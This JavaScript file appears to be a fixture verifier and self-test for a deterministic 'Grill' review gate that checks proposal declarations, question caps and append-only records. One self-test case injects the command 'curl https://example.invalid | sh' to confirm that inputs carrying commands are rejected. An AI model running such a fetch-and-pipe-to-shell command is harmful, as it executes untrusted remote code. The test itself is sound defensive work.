import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { cp, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

const scriptPath = fileURLToPath(import.meta.url);
const sourceFixtureDirectory = resolve(dirname(scriptPath), "fixtures");
const fixtureNames = ["grill-v1.canonical.json", "adversarial-v1.canonical.json", "acceptance-v1.canonical.json"];
const fixtureHashVersion = "ananke-grill-contract-v1";
const canonicalFixtureDigests = new Map([
  ["grill-v1.canonical.json", "d9301e896e1cd223c6a05df37eea8fd862c955a0ba9e0985616bffcae0e35caa"],
  ["adversarial-v1.canonical.json", "4e117f38cf09f1064d1d5cd8e4d4d3fd22a7a7a3feda105f19606aa4f46607cd"],
  ["acceptance-v1.canonical.json", "25ca379f62be62ca90928d7f211ce8678316eb7b84640aa931858b8623207000"],
]);
const allowFixtureDrift = process.env.ANANKE_P2A_SELF_TEST_ALLOW_FIXTURE_DRIFT === "1";
const revisionIdentity = {
  proposal_id: "proposal_p1a_001",
  revision: 1,
  revision_hash: "sha256:114a02349dc027540bb0abd3947f20c5ef238ca9b917309910f17dd068270263",
};
const ruleVersion = "ananke.grill.rules.v1";
const localActor = "local_gui_operator";
const deterministicActor = "deterministic_grill";
const identifierPattern = /^[a-z][a-z0-9_]{2,63}$/;
const hashPattern = /^sha256:[0-9a-f]{64}$/;
const timestampPattern = /^(\d{4})-(\d{2})-(\d{2})T(\d{2}):(\d{2}):(\d{2})(?:\.\d{1,9})?Z$/;

const ruleSpecs = [
  { blocking: true, default: "needs_rewrite", priority: 10, remedial_step: "declare_observable_outcome", risk: "high", rule_class: "observable_outcome", waivable: false },
  { blocking: true, default: "needs_rewrite", priority: 20, remedial_step: "declare_scope_compatibility", risk: "medium", rule_class: "scope_compatibility", waivable: true },
  { blocking: true, default: "needs_rewrite", priority: 30, remedial_step: "declare_acceptance_evidence", risk: "high", rule_class: "acceptance_evidence", waivable: false },
  { blocking: true, default: "deny", priority: 40, remedial_step: "record_local_authorization", risk: "critical", rule_class: "destructive_external_authorization", waivable: false },
  { blocking: true, default: "needs_rewrite", priority: 50, remedial_step: "require_isolated_worktree", risk: "high", rule_class: "adapter_worktree_isolation", waivable: false },
  { blocking: true, default: "needs_rewrite", priority: 60, remedial_step: "set_deadline_attempt_cap", risk: "high", rule_class: "autonomy_budget", waivable: false },
];
const questionIDs = Object.fromEntries(ruleSpecs.map(({ rule_class }) => [rule_class, `grill_question_${rule_class}`]));

function optionValue(name) {
  const index = process.argv.indexOf(name);
  if (index === -1) return undefined;
  assert.ok(process.argv[index + 1], `${name} requires a value`);
  return process.argv[index + 1];
}

function expectObject(value, name) {
  assert.ok(value !== null && typeof value === "object" && !Array.isArray(value), `${name} must be an object`);
}

function expectKeys(value, expected, name) {
  expectObject(value, name);
  for (const key of Object.keys(value)) {
    assert.ok(expected.includes(key), `unexpected ${name} property ${key}`);
  }
  assert.deepEqual(Object.keys(value).sort(), [...expected].sort(), `${name} properties`);
}

function assertNoUnpairedSurrogates(value, path = "$") {
  if (typeof value === "string") {
    for (let index = 0; index < value.length; index += 1) {
      const codeUnit = value.charCodeAt(index);
      if (codeUnit >= 0xd800 && codeUnit <= 0xdbff) {
        const next = value.charCodeAt(index + 1);
        assert.ok(next >= 0xdc00 && next <= 0xdfff, `unpaired Unicode surrogate at ${path}[${index}]`);
        index += 1;
      } else {
        assert.ok(codeUnit < 0xdc00 || codeUnit > 0xdfff, `unpaired Unicode surrogate at ${path}[${index}]`);
      }
    }
    return;
  }
  if (Array.isArray(value)) {
    value.forEach((entry, index) => assertNoUnpairedSurrogates(entry, `${path}[${index}]`));
    return;
  }
  if (value === null || typeof value !== "object") return;
  for (const [key, entry] of Object.entries(value)) {
    assertNoUnpairedSurrogates(key, `${path}.{key}`);
    assertNoUnpairedSurrogates(entry, `${path}.${key}`);
  }
}

function canonicalJson(value) {
  if (value === null) return "null";
  if (typeof value === "boolean") return value ? "true" : "false";
  if (typeof value === "string") return JSON.stringify(value);
  if (typeof value === "number") {
    assert.ok(Number.isFinite(value), "canonical JSON forbids non-finite numbers");
    return JSON.stringify(value);
  }
  if (Array.isArray(value)) return `[${value.map(canonicalJson).join(",")}]`;
  assert.equal(typeof value, "object", `unsupported canonical JSON value: ${typeof value}`);
  assert.equal(Object.getPrototypeOf(value), Object.prototype, "canonical JSON requires plain objects");
  return `{${Object.keys(value).sort().map((key) => `${JSON.stringify(key)}:${canonicalJson(value[key])}`).join(",")}}`;
}

function digest(bytes) {
  return createHash("sha256").update(bytes).digest("hex");
}

function hashCanonical(value) {
  return `sha256:${digest(Buffer.from(canonicalJson(value), "utf8"))}`;
}

function assertIdentifier(value, name) {
  assert.ok(typeof value === "string" && identifierPattern.test(value), `${name} must be an identifier`);
}

function assertHash(value, name) {
  assert.ok(typeof value === "string" && hashPattern.test(value), `${name} must be a SHA-256 hash`);
}

function assertPositiveInteger(value, name) {
  assert.ok(Number.isInteger(value) && value > 0, `${name} must be a positive integer`);
}

function assertTimestamp(value, name) {
  assert.ok(typeof value === "string", `${name} must be a semantic UTC RFC 3339 timestamp`);
  const match = timestampPattern.exec(value);
  assert.ok(match, `${name} must be a semantic UTC RFC 3339 timestamp`);
  const [year, month, day, hour, minute, second] = match.slice(1).map(Number);
  const daysInMonth = month === 2
    ? (year % 4 === 0 && (year % 100 !== 0 || year % 400 === 0) ? 29 : 28)
    : (month === 4 || month === 6 || month === 9 || month === 11 ? 30 : 31);
  assert.ok(month >= 1 && month <= 12 && day >= 1 && day <= daysInMonth && hour <= 23 && minute <= 59 && second <= 59, `${name} must be a semantic UTC RFC 3339 timestamp`);
}

function assertIdentity(value, name) {
  expectObject(value, name);
  assertIdentifier(value.proposal_id, `${name}.proposal_id`);
  assertPositiveInteger(value.revision, `${name}.revision`);
  assertHash(value.revision_hash, `${name}.revision_hash`);
  assert.deepEqual(
    { proposal_id: value.proposal_id, revision: value.revision, revision_hash: value.revision_hash },
    revisionIdentity,
    `${name} must bind the exact frozen P1a Revision`,
  );
}

function assertReviewOnlyShape(value, path = "$") {
  if (Array.isArray(value)) {
    value.forEach((entry, index) => assertReviewOnlyShape(entry, `${path}[${index}]`));
    return;
  }
  if (value === null || typeof value !== "object") return;
  const forbidden = new Set(["approval", "approval_state", "claim", "command", "execution", "loop", "model_output", "retry_policy", "task", "worker"]);
  for (const [key, entry] of Object.entries(value)) {
    assert.ok(!forbidden.has(key), `review-only contract forbids ${path}.${key}`);
    assertReviewOnlyShape(entry, `${path}.${key}`);
  }
}

function validateInput(input, name) {
  expectKeys(input, ["declarations", "proposal_id", "revision", "revision_hash", "schema_version"], name);
  assert.equal(input.schema_version, "ananke.grill.input.v1", `${name}.schema_version`);
  assertIdentity(input, name);
  const declarations = input.declarations;
  expectKeys(
    declarations,
    ["acceptance_evidence", "adapter_mode", "autonomy", "destructive_external", "local_authorization", "observable_outcome", "scope_compatibility", "worktree_isolation"],
    `${name}.declarations`,
  );
  assert.ok(["absent", "declared"].includes(declarations.observable_outcome), `${name}.observable_outcome`);
  assert.ok(["absent", "declared"].includes(declarations.scope_compatibility), `${name}.scope_compatibility`);
  assert.ok(["absent", "declared"].includes(declarations.acceptance_evidence), `${name}.acceptance_evidence`);
  assert.ok(["none", "declared"].includes(declarations.destructive_external), `${name}.destructive_external`);
  assert.ok(["not_required", "recorded", "unrecorded"].includes(declarations.local_authorization), `${name}.local_authorization`);
  assert.ok(["none", "read_only"].includes(declarations.adapter_mode), `${name}.adapter_mode`);
  assert.ok(["not_applicable", "isolated", "not_isolated"].includes(declarations.worktree_isolation), `${name}.worktree_isolation`);
  if (declarations.adapter_mode === "none") {
    assert.equal(declarations.worktree_isolation, "not_applicable", `${name}.worktree_isolation without an adapter`);
  }
  if (declarations.destructive_external === "none") {
    assert.equal(declarations.local_authorization, "not_required", `${name}.local_authorization without destructive or external work`);
  }
  expectKeys(declarations.autonomy, ["attempt_cap", "deadline"], `${name}.autonomy`);
  const { attempt_cap: attemptCap, deadline } = declarations.autonomy;
  assert.ok(deadline === null || typeof deadline === "string", `${name}.deadline must be null or a timestamp`);
  if (deadline !== null) assertTimestamp(deadline, `${name}.deadline`);
  assert.ok(attemptCap === null || Number.isInteger(attemptCap), `${name}.attempt_cap must be null or an integer`);
  if (attemptCap !== null) assert.ok(attemptCap >= 1 && attemptCap <= 100, "attempt_cap must be 1 through 100");
  assertReviewOnlyShape(input, name);
}

function triggeredRules(input) {
  const declaration = input.declarations;
  return ruleSpecs.filter(({ rule_class: ruleClass }) => {
    switch (ruleClass) {
      case "observable_outcome": return declaration.observable_outcome !== "declared";
      case "scope_compatibility": return declaration.scope_compatibility !== "declared";
      case "acceptance_evidence": return declaration.acceptance_evidence !== "declared";
      case "destructive_external_authorization": return declaration.destructive_external === "declared" && declaration.local_authorization !== "recorded";
      case "adapter_worktree_isolation": return declaration.adapter_mode !== "none" && declaration.worktree_isolation !== "isolated";
      case "autonomy_budget": return declaration.autonomy.deadline === null || declaration.autonomy.attempt_cap === null;
      default: throw new Error(`unsupported Grill rule ${ruleClass}`);
    }
  });
}

function evaluate(input, { existingRuleClasses = [], priorQuestionCount = 0, waivedRuleClasses = [] } = {}) {
  validateInput(input, "Grill input");
  assert.ok(Number.isInteger(priorQuestionCount) && priorQuestionCount >= 0, "prior question count must be nonnegative");
  const knownRules = new Set(ruleSpecs.map(({ rule_class: ruleClass }) => ruleClass));
  existingRuleClasses.forEach((ruleClass) => assert.ok(knownRules.has(ruleClass), `unknown existing Grill rule ${ruleClass}`));
  waivedRuleClasses.forEach((ruleClass) => {
    const rule = ruleSpecs.find(({ rule_class: candidate }) => candidate === ruleClass);
    assert.ok(rule?.waivable, `non-waivable Grill rule ${ruleClass} cannot be overridden`);
  });
  if (priorQuestionCount >= 10) {
    return { deferred_rule_classes: [], new_question_rule_classes: [], shown_rule_classes: [], status: "needs_rewrite" };
  }
  const existing = new Set(existingRuleClasses);
  const waived = new Set(waivedRuleClasses);
  const active = triggeredRules(input).filter(({ rule_class: ruleClass }) => !waived.has(ruleClass));
  const alreadyShown = active.filter(({ rule_class: ruleClass }) => existing.has(ruleClass));
  const available = active.filter(({ rule_class: ruleClass }) => !existing.has(ruleClass));
  const newQuestionLimit = Math.min(5, 10 - priorQuestionCount);
  const newRules = available.slice(0, Math.min(newQuestionLimit, Math.max(0, 5 - alreadyShown.length)));
  const shown = [...alreadyShown, ...newRules].sort((left, right) => left.priority - right.priority);
  const shownRuleClasses = shown.map(({ rule_class: ruleClass }) => ruleClass);
  return {
    deferred_rule_classes: active.map(({ rule_class: ruleClass }) => ruleClass).filter((ruleClass) => !shownRuleClasses.includes(ruleClass)),
    new_question_rule_classes: newRules.map(({ rule_class: ruleClass }) => ruleClass),
    shown_rule_classes: shownRuleClasses,
    status: active.length === 0 ? "clear" : "blocked",
  };
}

function questionResult(result) {
  return {
    deferred_rule_classes: result.deferred_rule_classes,
    new_question_ids: result.new_question_rule_classes.map((ruleClass) => questionIDs[ruleClass]),
    shown_question_ids: result.shown_rule_classes.map((ruleClass) => questionIDs[ruleClass]),
    status: result.status,
  };
}

function assertQuestion(record, expectedSequence) {
  expectKeys(record, ["blocking", "default", "proposal_id", "question_id", "question_sequence", "record_sequence", "remedial_step", "revision", "revision_hash", "risk", "rule_class", "rule_version", "schema_version", "waivable", "written_at", "written_by"], `question ${expectedSequence}`);
  assert.equal(record.schema_version, "ananke.grill.question.v1", `question ${expectedSequence}.schema_version`);
  assertIdentity(record, `question ${expectedSequence}`);
  assert.equal(record.rule_version, ruleVersion, `question ${expectedSequence}.rule_version`);
  const rule = ruleSpecs.find(({ rule_class: ruleClass }) => ruleClass === record.rule_class);
  assert.ok(rule, `question ${expectedSequence} must use one of exactly six rule classes`);
  assert.deepEqual(
    { blocking: record.blocking, default: record.default, remedial_step: record.remedial_step, risk: record.risk, rule_class: record.rule_class, waivable: record.waivable },
    { blocking: rule.blocking, default: rule.default, remedial_step: rule.remedial_step, risk: rule.risk, rule_class: rule.rule_class, waivable: rule.waivable },
    `question ${expectedSequence} fixed rule fields`,
  );
  assert.equal(record.question_id, questionIDs[record.rule_class], `question ${expectedSequence}.question_id`);
  assert.equal(record.question_sequence, expectedSequence, `question ${expectedSequence}.question_sequence`);
  assertTimestamp(record.written_at, `question ${expectedSequence}.written_at`);
  assert.equal(record.written_by, deterministicActor, `question ${expectedSequence}.written_by`);
}

function verifyRecords(records) {
  assert.ok(Array.isArray(records) && records.length === 9, "append-only Grill record inventory");
  records.forEach((record, index) => {
    expectObject(record, `record ${index + 1}`);
    assert.equal(record.record_sequence, index + 1, "append-only Grill record sequence");
    assertIdentity(record, `record ${index + 1}`);
    assert.equal(record.rule_version, ruleVersion, `record ${index + 1}.rule_version`);
  });
  const questions = records.filter(({ schema_version: schemaVersion }) => schemaVersion === "ananke.grill.question.v1");
  assert.equal(questions.length, 6, "six deterministic Grill questions");
  questions.sort((left, right) => left.question_sequence - right.question_sequence).forEach((record, index) => assertQuestion(record, index + 1));
  assert.deepEqual(questions.map(({ rule_class: ruleClass }) => ruleClass), ruleSpecs.map(({ rule_class: ruleClass }) => ruleClass), "question priority inventory");

  const defaultRecord = records[5];
  expectKeys(defaultRecord, ["default", "proposal_id", "question_id", "record_sequence", "revision", "revision_hash", "rule_version", "schema_version", "written_at", "written_by"], "default record");
  assert.equal(defaultRecord.schema_version, "ananke.grill.default.v1", "default record schema");
  assert.equal(defaultRecord.question_id, questionIDs.scope_compatibility, "default record question link");
  assert.equal(defaultRecord.default, "needs_rewrite", "default record value");
  assert.equal(defaultRecord.written_by, deterministicActor, "default record writer");
  assertTimestamp(defaultRecord.written_at, "default record timestamp");

  const answerRecord = records[6];
  expectKeys(answerRecord, ["answer", "proposal_id", "question_id", "record_sequence", "revision", "revision_hash", "rule_version", "schema_version", "written_at", "written_by"], "answer record");
  assert.equal(answerRecord.schema_version, "ananke.grill.answer.v1", "answer record schema");
  assert.equal(answerRecord.question_id, questionIDs.acceptance_evidence, "answer record question link");
  assert.equal(answerRecord.answer, "acknowledged", "answer record value");
  assert.equal(answerRecord.written_by, localActor, "answer record writer");
  assertTimestamp(answerRecord.written_at, "answer record timestamp");

  const overrideRecord = records[7];
  expectKeys(overrideRecord, ["override", "proposal_id", "question_id", "record_sequence", "revision", "revision_hash", "rule_version", "schema_version", "written_at", "written_by"], "override record");
  assert.equal(overrideRecord.schema_version, "ananke.grill.override.v1", "override record schema");
  assert.equal(overrideRecord.question_id, questionIDs.scope_compatibility, "override record question link");
  assert.equal(overrideRecord.override, "waived", "override record value");
  assert.equal(overrideRecord.written_by, localActor, "override record writer");
  assertTimestamp(overrideRecord.written_at, "override record timestamp");
  assert.equal(ruleSpecs.find(({ rule_class: ruleClass }) => ruleClass === "scope_compatibility").waivable, true, "override must target a waivable question");
}

function expectedEvaluation(input, result) {
  return {
    evaluation_id: "grill_evaluation_p2a_001",
    input_hash: hashCanonical(input),
    ...revisionIdentity,
    rule_version: ruleVersion,
    ...questionResult(result),
  };
}

function verifyGrill(grill) {
  expectKeys(grill, ["evaluation", "input", "records", "rules", "schema_version", "valid_input"], "Grill fixture");
  assert.equal(grill.schema_version, "ananke.grill.fixture.v1", "Grill fixture schema");
  assert.deepEqual(grill.rules, ruleSpecs, "Grill rule table");
  validateInput(grill.input, "fixture input");
  validateInput(grill.valid_input, "fixture valid input");
  assert.equal(evaluate(grill.valid_input).status, "clear", "complete declarations are Grill-clear only");
  verifyRecords(grill.records);
  expectKeys(grill.evaluation, ["after_scope_override", "initial", "same_input_replay"], "evaluation vectors");

  const firstFive = ruleSpecs.slice(0, 5).map(({ rule_class: ruleClass }) => ruleClass);
  const initial = expectedEvaluation(grill.input, evaluate(grill.input));
  assert.deepEqual(grill.evaluation.initial, initial, "initial evaluation fixed identity and five-question bound");
  assert.deepEqual(
    grill.evaluation.same_input_replay,
    { ...expectedEvaluation(grill.input, evaluate(grill.input, { existingRuleClasses: firstFive, priorQuestionCount: 5 })), new_records: 0 },
    "same-input re-evaluation is idempotent",
  );
  assert.deepEqual(
    grill.evaluation.after_scope_override,
    expectedEvaluation(grill.input, evaluate(grill.input, { existingRuleClasses: firstFive, priorQuestionCount: 5, waivedRuleClasses: ["scope_compatibility"] })),
    "waiver releases one display slot without changing the Revision",
  );
  assertReviewOnlyShape(grill);
}

function verifyAdversarial(value) {
  expectKeys(value, ["base_input", "cases", "schema_version"], "adversarial fixture");
  assert.equal(value.schema_version, "ananke.grill.adversarial.v1", "adversarial fixture schema");
  validateInput(value.base_input, "adversarial base input");
  assert.ok(Array.isArray(value.cases) && value.cases.length === 7, "adversarial fixture inventory");
  const expectedIDs = [
    "revision_prose_cannot_be_grill_input",
    "model_content_cannot_be_grill_input",
    "command_cannot_be_grill_input",
    "approval_cannot_be_grill_input",
    "unbounded_loop_cannot_be_grill_input",
    "attempt_cap_is_bounded",
    "missing_budget_blocks_without_execution",
  ];
  assert.deepEqual(value.cases.map(({ id }) => id), expectedIDs, "adversarial case order");
  for (const testCase of value.cases) {
    expectObject(testCase, `adversarial ${testCase.id}`);
    assertIdentifier(testCase.id, `adversarial ${testCase.id}.id`);
    assert.ok(Object.hasOwn(testCase, "patch"), `adversarial ${testCase.id} patch`);
    const input = { ...structuredClone(value.base_input), ...testCase.patch };
    if (Object.hasOwn(testCase, "rejection")) {
      expectKeys(testCase, ["id", "patch", "rejection"], `adversarial ${testCase.id}`);
      assert.throws(() => validateInput(input, "Grill input"), new RegExp(testCase.rejection), `adversarial ${testCase.id}`);
    } else {
      expectKeys(testCase, ["id", "patch", "result"], `adversarial ${testCase.id}`);
      const result = questionResult(evaluate(input));
      assert.deepEqual(result, { deferred_rule_classes: [], new_question_ids: [questionIDs.autonomy_budget], shown_question_ids: [questionIDs.autonomy_budget], status: "blocked" }, `adversarial ${testCase.id} review-only result`);
      assert.deepEqual(testCase.result, { deferred_rule_classes: [], shown_question_ids: [questionIDs.autonomy_budget], status: "blocked" }, `adversarial ${testCase.id} fixture result`);
      expectKeys(result, ["deferred_rule_classes", "new_question_ids", "shown_question_ids", "status"], `adversarial ${testCase.id} output`);
    }
  }
}

function verifyAcceptance(value) {
  expectKeys(value, ["cases", "schema_version"], "acceptance fixture");
  assert.equal(value.schema_version, "ananke.grill.acceptance.v1", "acceptance fixture schema");
  assert.ok(Array.isArray(value.cases) && value.cases.length === 6, "acceptance fixture inventory");
  const expectedIDs = [
    "complete_declarations_clear_grill_only",
    "six_triggered_rules_show_five",
    "same_input_replay_is_idempotent",
    "waiver_releases_one_display_slot",
    "remaining_question_capacity_stops_at_ten",
    "revision_question_cap_requires_rewrite",
  ];
  assert.deepEqual(value.cases.map(({ id }) => id), expectedIDs, "acceptance case order");
  for (const testCase of value.cases) {
    expectKeys(testCase, ["given", "id", "then"], `acceptance ${testCase.id}`);
    assertIdentifier(testCase.id, `acceptance ${testCase.id}.id`);
    const allowedGiven = ["existing_rule_classes", "input", "prior_question_count", "same_input_replay", "waived_rule_classes"];
    expectObject(testCase.given, `acceptance ${testCase.id}.given`);
    for (const key of Object.keys(testCase.given)) assert.ok(allowedGiven.includes(key), `unexpected acceptance given property ${key}`);
    validateInput(testCase.given.input, `acceptance ${testCase.id}.input`);
    const result = evaluate(testCase.given.input, {
      existingRuleClasses: testCase.given.existing_rule_classes ?? [],
      priorQuestionCount: testCase.given.prior_question_count,
      waivedRuleClasses: testCase.given.waived_rule_classes ?? [],
    });
    expectKeys(testCase.then, ["deferred_rule_classes", "new_question_rule_classes", "shown_rule_classes", "status"], `acceptance ${testCase.id}.then`);
    assert.deepEqual(result, testCase.then, `acceptance ${testCase.id} outcome`);
    assert.ok(testCase.given.prior_question_count + result.new_question_rule_classes.length <= 10, `acceptance ${testCase.id} must not exceed the Revision question cap`);
    if (testCase.id === "remaining_question_capacity_stops_at_ten") {
      assert.equal(result.new_question_rule_classes.length, 1, "nine prior Questions leave one append slot");
      assert.equal(testCase.given.prior_question_count + result.new_question_rule_classes.length, 10, "nine prior Questions reach the Revision cap exactly");
    }
  }
}

async function readCanonical(directory, name, manifest) {
  const bytes = await readFile(join(directory, name));
  assert.equal(digest(bytes), manifest.get(name), `fixture digest mismatch: ${name}`);
  if (!allowFixtureDrift) assert.equal(digest(bytes), canonicalFixtureDigests.get(name), `canonical fixture digest mismatch: ${name}`);
  assert.ok(!bytes.subarray(0, 3).equals(Buffer.from([0xef, 0xbb, 0xbf])), `${name} has a UTF-8 BOM`);
  const text = bytes.toString("utf8");
  assert.ok(Buffer.from(text, "utf8").equals(bytes), `${name} is not UTF-8`);
  const value = JSON.parse(text);
  assertNoUnpairedSurrogates(value);
  assert.equal(text, canonicalJson(value), `${name} is not canonical JCS bytes`);
  return value;
}

async function readManifest(directory) {
  const text = await readFile(join(directory, "fixtures.sha256"), "utf8");
  assert.ok(!text.endsWith("\n"), "fixtures.sha256 must not end with a newline");
  const entries = text.split("\n").map((line) => {
    const match = line.match(/^([a-z0-9-]+) sha256 ([0-9a-f]{64}) ([a-z0-9.-]+)$/);
    assert.ok(match, `invalid hash manifest entry: ${line}`);
    return { version: match[1], digest: match[2], name: match[3] };
  });
  assert.deepEqual(entries.map(({ name }) => name), fixtureNames, "fixture hash manifest inventory");
  entries.forEach(({ version }) => assert.equal(version, fixtureHashVersion, "fixture hash manifest version"));
  return new Map(entries.map(({ name, digest: entryDigest }) => [name, entryDigest]));
}

async function verify(directory) {
  const manifest = await readManifest(directory);
  const fixtures = Object.fromEntries(await Promise.all(fixtureNames.map(async (name) => [name, await readCanonical(directory, name, manifest)])));
  verifyGrill(fixtures["grill-v1.canonical.json"]);
  verifyAdversarial(fixtures["adversarial-v1.canonical.json"]);
  verifyAcceptance(fixtures["acceptance-v1.canonical.json"]);
}

async function rewriteManifest(directory) {
  const entries = await Promise.all(fixtureNames.map(async (name) => `${fixtureHashVersion} sha256 ${digest(await readFile(join(directory, name)))} ${name}`));
  await writeFile(join(directory, "fixtures.sha256"), entries.join("\n"));
}

async function writeCanonical(directory, name, value) {
  await writeFile(join(directory, name), canonicalJson(value));
}

async function readJSON(directory, name) {
  return JSON.parse(await readFile(join(directory, name), "utf8"));
}

function runCopiedVerifier(directory, { allowDrift = false } = {}) {
  return spawnSync(process.execPath, [scriptPath, "--fixtures", directory], {
    encoding: "utf8",
    env: { ...process.env, ANANKE_P2A_SELF_TEST_ALLOW_FIXTURE_DRIFT: allowDrift ? "1" : "0" },
  });
}

function assertRejected(result, pattern, name) {
  assert.notEqual(result.status, 0, `${name} was accepted`);
  assert.match(`${result.stdout}${result.stderr}`, pattern, `${name} rejection reason`);
}

async function selfTest() {
  const root = await mkdtemp(join(tmpdir(), "ananke-p2a-contract-"));
  const copiedFixtures = join(root, "fixtures");
  const resetCopiedFixtures = async () => {
    await rm(copiedFixtures, { force: true, recursive: true });
    await cp(sourceFixtureDirectory, copiedFixtures, { recursive: true });
  };
  try {
    await resetCopiedFixtures();
    const baseline = runCopiedVerifier(copiedFixtures);
    assert.equal(baseline.status, 0, `fixture verifier baseline failed:\n${baseline.stdout}${baseline.stderr}`);

    await resetCopiedFixtures();
    const overCapOutcome = await readJSON(copiedFixtures, "acceptance-v1.canonical.json");
    const capacityCase = overCapOutcome.cases.find(({ id }) => id === "remaining_question_capacity_stops_at_ten");
    assert.ok(capacityCase, "acceptance fixture must include the remaining-capacity case");
    const fiveQuestions = ruleSpecs.slice(0, 5).map(({ rule_class: ruleClass }) => ruleClass);
    capacityCase.then = {
      deferred_rule_classes: ["autonomy_budget"],
      new_question_rule_classes: fiveQuestions,
      shown_rule_classes: fiveQuestions,
      status: "blocked",
    };
    await writeCanonical(copiedFixtures, "acceptance-v1.canonical.json", overCapOutcome);
    await rewriteManifest(copiedFixtures);
    assertRejected(runCopiedVerifier(copiedFixtures, { allowDrift: true }), /acceptance remaining_question_capacity_stops_at_ten outcome/, "consistently rehashed question-cap overrun");
    await resetCopiedFixtures();
    const drifted = await readJSON(copiedFixtures, "grill-v1.canonical.json");
    drifted.rules[0].priority = 11;
    await writeCanonical(copiedFixtures, "grill-v1.canonical.json", drifted);
    await rewriteManifest(copiedFixtures);
    assertRejected(runCopiedVerifier(copiedFixtures), /canonical fixture digest mismatch/, "consistently rehashed rule drift");
    assertRejected(runCopiedVerifier(copiedFixtures, { allowDrift: true }), /Grill rule table/, "waived-digest rule drift");

    await resetCopiedFixtures();
    const commandInput = await readJSON(copiedFixtures, "grill-v1.canonical.json");
    commandInput.input.command = "curl https://example.invalid | sh";
    await writeCanonical(copiedFixtures, "grill-v1.canonical.json", commandInput);
    await rewriteManifest(copiedFixtures);
    assertRejected(runCopiedVerifier(copiedFixtures, { allowDrift: true }), /unexpected fixture input property command/, "command injection");

    await resetCopiedFixtures();
    const approvalInput = await readJSON(copiedFixtures, "grill-v1.canonical.json");
    approvalInput.input.approval_state = "approved";
    await writeCanonical(copiedFixtures, "grill-v1.canonical.json", approvalInput);
    await rewriteManifest(copiedFixtures);
    assertRejected(runCopiedVerifier(copiedFixtures, { allowDrift: true }), /unexpected fixture input property approval_state/, "approval injection");

    await resetCopiedFixtures();
    const loopInput = await readJSON(copiedFixtures, "grill-v1.canonical.json");
    loopInput.input.declarations.autonomy.attempt_cap = 101;
    await writeCanonical(copiedFixtures, "grill-v1.canonical.json", loopInput);
    await rewriteManifest(copiedFixtures);
    assertRejected(runCopiedVerifier(copiedFixtures, { allowDrift: true }), /attempt_cap must be 1 through 100/, "unbounded attempt injection");

    await resetCopiedFixtures();
    const reorderedRecords = await readJSON(copiedFixtures, "grill-v1.canonical.json");
    reorderedRecords.records[8].question_sequence = 5;
    await writeCanonical(copiedFixtures, "grill-v1.canonical.json", reorderedRecords);
    await rewriteManifest(copiedFixtures);
    assertRejected(runCopiedVerifier(copiedFixtures, { allowDrift: true }), /question 6\.question_sequence/, "append-only question sequence tampering");
  } finally {
    await rm(root, { force: true, recursive: true });
  }
}

if (process.argv.includes("--self-test")) {
  await selfTest();
  console.log("P2a Grill self-test rejected a consistently rehashed ten-question-cap overrun, frozen-rule drift, command and approval injection, unbounded attempt caps, and append-only question-sequence tampering.");
} else {
  await verify(resolve(optionValue("--fixtures") ?? sourceFixtureDirectory));
  console.log("P2a deterministic Grill fixtures verified: six rule classes, revision-bound append-only records, five-question display bound, nine-to-ten append boundary, ten-question rewrite cap, idempotent replay, and adversarial review-only inputs.");
}
